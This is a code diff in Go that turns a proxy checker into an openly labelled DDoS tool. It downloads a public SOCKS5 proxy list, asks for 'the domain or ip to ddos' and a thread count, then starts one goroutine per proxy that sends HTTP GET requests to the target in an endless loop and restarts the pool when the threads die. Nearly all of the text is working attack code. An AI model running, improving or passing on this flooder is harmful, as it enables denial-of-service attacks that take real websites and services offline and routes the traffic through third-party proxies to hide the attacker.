@@ -21,9 +21,10 @@ var statusCodeToEscape = []string{
 	"407 Proxy Authentication Required",
 	"400 Bad Request",
 	"502 Proxy Error",
+	"403 Forbidden",
+	"503 Service Unavailable",
+	"504 DNS Name Not Found",
 }
-
-var wg sync.WaitGroup
 
 func getProxyList() []string {
 	//get the list of proxy at https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
@@ -42,6 +43,21 @@ func getProxyList() []string {
 
 	proxy_list := strings.Replace(string(body), "\r", "", -1)
 	return strings.Split(proxy_list, "\n")
+}
+
+func chunkSlice(s []string, total_to_divided int) [][]string {
+	var divided [][]string
+	var chunk = float32(len(s) / total_to_divided)
+	var start, end = 0, 0
+	for i := 0; i < total_to_divided; i++ {
+		end = start + int(chunk)
+		if end > len(s) {
+			end = len(s)
+		}
+		divided = append(divided, s[start:end])
+		start = end
+	}
+	return divided
 }
 
 func stringInSlice(a string, list []string) bool {
@@ -67,6 +83,9 @@ func handlerProxy(domain, proxy string) string {
 		Transport: &http.Transport{
 			Proxy: http.ProxyURL(proxyUrl),
 		}}
+
+	//client timeout after 1 second
+	client.Timeout = time.Second * 5
 	//connect to the website
 	resp, err := client.Get("http://" + domain)
 	if err != nil {
@@ -75,90 +94,55 @@ func handlerProxy(domain, proxy string) string {
 	defer resp.Body.Close()
 	//if resp is 503 too many connection
 	// make [][]string statusCodeToEscape
-
+	if stringInSlice(resp.Status, statusCodeToEscape) {
+		return "error"
+	}
 	if resp.StatusCode != 0 {
+		fmt.Println(resp.Status)
 		return resp.Status
 	}
 	return "error"
 }
 
-func handlerProxyThread(domain string, proxy []string) string {
-	//just connect to the website and check the status code
-	//if handler_proxy return error check the next proxy
-	for i := 0; i < len(proxy); i++ {
-		var result = handlerProxy(domain, proxy[i])
-		if result != "error" {
-			return result
-		}
-	}
-	return "error"
-}
-
-// create a chunk function to split the proxy list and return a list of list string with a len of total_to_divided
-func chunkSlice(s []string, total_to_divided int) [][]string {
-	var divided [][]string
-	var chunk = float32(len(s) / total_to_divided)
-	var start, end = 0, 0
-	for i := 0; i < total_to_divided; i++ {
-		end = start + int(chunk)
-		if end > len(s) {
-			end = len(s)
-		}
-		divided = append(divided, s[start:end])
-		start = end
-	}
-	return divided
-}
-
-func readResult(resultChan chan string) {
-	defer wg.Done()
-	for {
-		var result = <-resultChan
-		if result != "error" {
-			fmt.Println(result)
-			time.Sleep(200 * time.Millisecond)
-			break
-		} else {
-			fmt.Println(result)
-		}
-	}
-}
-
 func main() {
-	//ask for a domain name
+	//get the list of proxy
+	proxy_list := getProxyList()
+	//ask for the domain or ip to ddos
+	fmt.Println("Enter the domain or ip to ddos")
 	var domain string
-	var thread int
-
-	fmt.Println("Enter a domain name: ")
 	fmt.Scanln(&domain)
+	//ask for the number of threads
+	fmt.Println("Enter the number of threads")
+	var threads int
+	fmt.Scanln(&threads)
+	//chunk the proxy list
+	chunked_proxy_list := chunkSlice(proxy_list, threads)
+	//start the threads
+	//create a channel list of good proxy
+	for {
+		var wg sync.WaitGroup
+		for _, chunk := range chunked_proxy_list {
+			for _, proxy := range chunk {
+				wg.Add(1)
+				go func() {
+					defer wg.Done()
+					for {
+						//time.Sleep(time.Millisecond * 100)
+						status := handlerProxy(domain, proxy)
+						if status != "error" {
+							fmt.Println("Thread found a good proxy")
+							continue
+						} else {
+							break
+						}
 
-	fmt.Println("Enter the number of thread: ")
-	fmt.Scanln(&thread)
-
-	//create chunk of proxy list for each thread
-	var chunkList = chunkSlice(getProxyList(), thread)
-	//create a channel to store the result
-	var resultChannel = make(chan string)
-	//create a thread for each chunk
-	quit := make(chan bool)
-	for j := 0; j <= len(chunkList); j++ {
-		for i := 0; i < thread; i++ {
-			wg.Add(1)
-			go func(i int) {
-				defer wg.Done()
-				for {
-					select {
-					case <-quit:
-						return
-					default:
-						resultChannel <- handlerProxyThread(domain, chunkList[i])
 					}
-				}
-			}(i)
+					fmt.Println("Thread died")
+					return
+				}()
+			}
 		}
-		wg.Add(1)
-		go readResult(resultChannel)
+		wg.Wait()
+		fmt.Println("All threads are dead, restarting")
 	}
-	wg.Wait()
-
 }
